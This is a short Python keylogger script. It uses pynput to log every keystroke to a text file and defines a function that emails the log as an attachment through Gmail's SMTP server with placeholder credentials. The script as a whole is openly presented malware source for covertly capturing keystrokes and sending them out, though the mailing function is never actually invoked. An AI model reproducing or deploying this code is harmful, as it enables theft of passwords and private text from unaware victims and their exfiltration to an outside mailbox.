# pynput to get pressed keyboard key and log it in a file
from pynput.keyboard import Listener, Key

# email and smtp libraries to send the logged keys file
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# global variables
filepath = "/home/dave/Documents/KEYLOGGER/"
keyfile = "log.txt"


# Function to send the log file via email
def send_mail():

    fromaddr = "XXXXX@gmail.com"
    toaddr = "XXXXX@gmail.com"
    password = "XXXX XXXX XXXX XXXX"

    # instance of MIMEMultipart
    msg = MIMEMultipart()
    
    # storing the senders email address  
    msg['From'] = fromaddr
    
    # storing the receivers email address 
    msg['To'] = toaddr
    
    # storing the subject 
    msg['Subject'] = "Log file ALERT!"
    
    # string to store the body of the mail
    body = "Hello, Here is your log file attached."
    
    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))
    
    # open the file to be sent 
    filename = keyfile
    attachment = open(f"{filepath + keyfile}", "rb")
    
    # instance of MIMEBase and named as p
    payload = MIMEBase('application', 'octet-stream')
    
    # To change the payload into encoded form
    payload.set_payload((attachment).read())
    
    # encode into base64
    encoders.encode_base64(payload)
    
    payload.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    
    # attach the instance 'p' to instance 'msg'
    msg.attach(payload)
    
    # creates SMTP session
    s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    
    # Authentication
    s.login(fromaddr, password)
    
    # Converts the Multipart msg into a string
    text = msg.as_string()
    
    # sending the mail
    s.sendmail(fromaddr, toaddr, text)
    
    # terminating the session
    s.quit()


# Function to get and log pressed keys
def key_pressed(key):

    char = str(key)
    with open(keyfile, "a") as log:
        if key == Key.space:
            log.write(" ")
        elif key == Key.enter:
            log.write("\n")
        elif key == Key.tab:
            log.write("\t")
        elif key == Key.shift:
            pass
        else:
            if "Key" not in char:
                char = char.replace("'", "")
                log.write(char)


# Start script when passed to python interpreter
if __name__ == "__main__":
    listener = Listener(on_press=key_pressed)
    listener.start()
    input()
